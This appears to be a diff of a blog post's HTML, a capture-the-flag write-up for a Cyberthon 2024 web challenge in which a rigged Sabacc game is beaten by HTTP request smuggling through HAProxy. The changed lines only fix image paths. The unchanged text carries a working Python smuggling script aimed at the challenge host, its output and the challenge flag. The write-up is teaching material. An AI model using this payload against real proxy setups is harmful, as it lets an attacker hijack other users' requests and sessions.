@@ -174,7 +174,7 @@
 </blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/Iscaraca/CTF-Challenges/tree/main/cyberthon2024/the_galaxys_best_smuggler">Link to source code</a></p>
 <p>In this challenge, you play against a bot in a modified version of blackjack, where the sweet spot is 20. Your opponent has rigged the cards such that they’ll always draw 20 at the start every time, while you’ll draw a measly 2. To get the flag, you’ll have to win the game.</p>
-<p><img src="/sabacc.png" alt="Sabacc game page"></p>
+<p><img src="/2024/05/04/cyberthon-2024/sabacc.png" alt="Sabacc game page"></p>
 <p>The rules of the game are simple.</p>
 <ul>
 <li><p>Your opponent will make the first move.</p>
@@ -209,7 +209,7 @@
 <h3 id="Constructing-our-Payload"><a href="#Constructing-our-Payload" class="headerlink" title="Constructing our Payload"></a>Constructing our Payload</h3><p>I will be using <a target="_blank" rel="noopener" href="https://github.com/siemens/edgeshark">edgeshark</a> to capture network traffic from within the docker environment, which will allow us to view the transfer of HTTP packets using Wireshark. This is not a necessary step, but it’s useful for a writeup&#x2F;tutorial such as this one.</p>
 <p>In this section, it is important that <strong>all requests are sent to the proxy directly</strong>. Sending these requests to your client will do nothing as the bot’s requests do not pass through the client.</p>
 <p>We’ll be monitoring HAProxy’s ethernet interface for this section. On round 3, the bot will send a GET request to the <code>/reveal</code> endpoint with its cookie.</p>
-<p><img src="/reveal.png" alt="Reveal request"></p>
+<p><img src="/2024/05/04/cyberthon-2024/reveal.png" alt="Reveal request"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /reveal HTTP/1.1</span><br><span class="line">Host: proxy:1080</span><br><span class="line">User-Agent: python-requests/2.31.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Cookie: player_id=9576b07a-88b5-4df0-94a0-39ded4ee47d2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
@@ -230,7 +230,7 @@
 
 <p>When the server is ready to process its next request, it reads the above as one full HTTP request, a GET request to <code>/hit</code> from the bot’s player ID. We’ve successfully tampered with the bot’s request!</p>
 <h3 id="One-Possible-Pitfall"><a href="#One-Possible-Pitfall" class="headerlink" title="One Possible Pitfall"></a>One Possible Pitfall</h3><p>Just sending this payload once will not work. Looking at the edgeshark capture, we can see that our TCP stream is closing right after we send our payload, and the GET request to <code>/reveal</code> doesn’t use the same stream. </p>
-<p><img src="/stream.png" alt="Stream capture"></p>
+<p><img src="/2024/05/04/cyberthon-2024/stream.png" alt="Stream capture"></p>
 <p>The issue is that Gunicorn spawns multiple threads per worker, so smuggling one of them won’t be enough. The simple workaround here is to send our payload to the proxy many times to ensure that all the TCP streams get polluted with our payload.</p>
 <h3 id="Final-Solution"><a href="#Final-Solution" class="headerlink" title="Final Solution"></a>Final Solution</h3><p>All we have to do is wait until its our move, either hit or stand, and run our solve script right before the bot sends in the request to reveal.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># The proxy port is 4941</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;GET /game-state HTTP/1.1\r\nHost: sabacc.chals.f.cyberthon24.ctf.sg:4941\r\nContent-Length: 30\r\nConnection: keep-alive\r\nTransfer-Encoding:chunked\r\n\r\n0\r\n\r\nGET /hit HTTP/1.1\r\nX-Foo:&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((<span class="string">&quot;sabacc.chals.f.cyberthon24.ctf.sg&quot;</span>, <span class="number">4941</span>))</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line">response = sock.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="built_in">print</span>(response.decode())</span><br></pre></td></tr></table></figure>
@@ -239,9 +239,9 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\user\sol&gt; python .\solution.py</span><br><span class="line">HTTP/1.1 406 NOT ACCEPTABLE</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Sat, 04 May 2024 12:06:26 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;:&quot;Player ID not set&quot;&#125;</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="/forced.png" alt="Forced draw"></p>
+<p><img src="/2024/05/04/cyberthon-2024/forced.png" alt="Forced draw"></p>
 <p>And all we have to do now is reveal.</p>
-<p><img src="/win.png" alt="Win"></p>
+<p><img src="/2024/05/04/cyberthon-2024/win.png" alt="Win"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cyberthon&#123;the_falcon_is_all_mine!&#125;</span><br></pre></td></tr></table></figure>
 
 
